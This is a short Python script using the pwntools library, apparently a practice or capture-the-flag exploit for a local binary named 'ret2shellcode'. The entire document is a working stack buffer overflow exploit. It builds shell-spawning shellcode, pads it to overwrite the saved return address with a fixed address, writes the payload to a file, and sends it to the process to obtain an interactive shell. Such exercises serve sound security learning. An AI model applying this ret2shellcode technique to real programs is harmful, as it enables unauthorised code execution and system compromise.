from pwn import *

context(arch="amd64")

shellcode_addr = p64(0x0000000000601080)
shellcode = asm('sub rsp, 100') + asm(shellcraft.sh())
payload = shellcode.ljust(0x78, 'a') + shellcode_addr

with open('ret2shellcode.payload', 'wb') as f:
	f.write(payload)

p = process('cmake-build-debug/ret2shellcode')
p.recvuntil("time!!\n")
p.send(payload)
p.interactive()
